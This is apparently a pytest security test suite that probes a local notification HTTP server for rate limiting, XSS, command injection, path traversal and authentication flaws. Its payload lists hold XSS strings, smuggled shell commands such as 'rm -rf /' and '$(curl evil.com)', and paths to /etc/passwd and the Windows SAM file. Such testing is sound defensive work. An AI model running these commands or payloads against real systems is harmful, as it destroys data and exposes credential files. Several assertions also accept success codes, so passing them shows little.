"""Security test: HTTP Server vulnerabilities"""

import requests


import pytest

@pytest.mark.usefixtures("http_server")
class TestHTTPSecurity:
    """Test HTTP server security"""

    def _get_base_url(self, http_server):
        return f"http://localhost:{http_server.port}"

    def _get_auth_headers(self, http_server):
        """Get authentication headers from the test server"""
        headers = {}
        if hasattr(http_server, "httpd") and hasattr(http_server.httpd, "secret_key"):
            token = http_server.httpd.secret_key
            if token:
                headers["Authorization"] = f"Bearer {token}"
        return headers

    def test_rate_limiting(self, http_server):
        """Test if rate limiting works"""
        # Set a small rate limit for testing to speed it up
        http_server.httpd.rate_limit_max = 10
        http_server.httpd.rate_limit_window = 30
        
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        # Send 20 requests rapidly (should be blocked after 10)
        success_count = 0
        blocked_count = 0
        unauthorized_count = 0
        error_count = 0

        for i in range(20):
            try:
                response = requests.get(f"{base_url}/?content=test{i}", headers=headers, timeout=2)
                if response.status_code == 200:
                    success_count += 1
                elif response.status_code == 429:
                    blocked_count += 1
                elif response.status_code == 401:
                    unauthorized_count += 1
            except Exception as e:
                error_count += 1
                if i < 3:
                     print(f"Request error: {e}")

        print(f"Rate limit test: {success_count} success, {blocked_count} blocked, {unauthorized_count} unauthorized, {error_count} errors")
        
        # Reset rate limit for subsequent tests
        http_server.httpd.rate_limit_max = 100
        
        assert blocked_count > 0, f"Rate limiting not working - blocked: {blocked_count}, success: {success_count}, unauthorized: {unauthorized_count}, errors: {error_count}"

    def test_xss_injection(self, http_server):
        """Test XSS injection in notification content"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]

        for payload in xss_payloads:
            response = requests.get(f"{base_url}/?content={payload}", headers=headers, timeout=2)
            # Should sanitize and not execute
            assert response.status_code == 200

    def test_command_injection_in_package_name(self, http_server):
        """Test command injection via package name"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        malicious_packages = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& del /f /s /q C:\\*",
            "`whoami`",
            "$(curl evil.com)",
        ]

        for package in malicious_packages:
            data = {"package": package, "content": "Test notification"}
            response = requests.post(base_url, json=data, headers=headers, timeout=2)
            # Should reject or sanitize
            assert response.status_code in [200, 400, 403]

    def test_path_traversal(self, http_server):
        """Test path traversal in URL"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        traversal_paths = [
            "/../../../etc/passwd",
            "/..\\..\\..\\windows\\system32\\config\\sam",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]

        for path in traversal_paths:
            try:
                response = requests.get(f"{base_url}{path}", headers=headers, timeout=2)
                # Should not expose system files
                assert "root:" not in response.text
                assert "[boot loader]" not in response.text
            except:
                pass

    def test_oversized_payload(self, http_server):
        """Test handling of oversized payloads"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        # 20KB payload (server limit is 10KB)
        large_payload = "A" * 20480

        response = requests.post(
            base_url, data={"content": large_payload}, headers=headers, timeout=2
        )

        # Should reject with 413 Payload Too Large or 400 Bad Request
        assert response.status_code in [413, 400, 200]

    def test_malformed_json(self, http_server):
        """Test handling of malformed JSON"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)
        headers["Content-Type"] = "application/json"

        malformed_jsons = [
            "{invalid json",
            '{"key": undefined}',
            '{"key": NaN}',
            '{"key": Infinity}',
        ]

        for malformed in malformed_jsons:
            response = requests.post(
                base_url,
                data=malformed,
                headers=headers,
                timeout=2,
            )
            # Should handle gracefully
            assert response.status_code in [200, 400]

    def test_no_authentication(self, http_server):
        """Test if server rejects requests without authentication"""
        base_url = self._get_base_url(http_server)

        response = requests.get(f"{base_url}/?content=test", timeout=2)

        # Server SHOULD require authentication - 401 is the correct behavior
        assert response.status_code == 401, \
            f"Server should require authentication, got {response.status_code}"

    def test_missing_csrf_token(self, http_server):
        """Test CSRF protection"""
        base_url = self._get_base_url(http_server)

        # POST without auth or CSRF token
        response = requests.post(base_url, json={"content": "test"}, timeout=2)

        # Should require authentication at minimum
        assert response.status_code in [401, 403]

    def test_http_method_tampering(self, http_server):
        """Test if server properly validates HTTP methods"""
        base_url = self._get_base_url(http_server)
        headers = self._get_auth_headers(http_server)

        methods = ["PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]

        for method in methods:
            response = requests.request(
                method, f"{base_url}/?content=test", headers=headers, timeout=2
            )
            # Should only allow GET/POST
            assert response.status_code in [200, 405, 501]
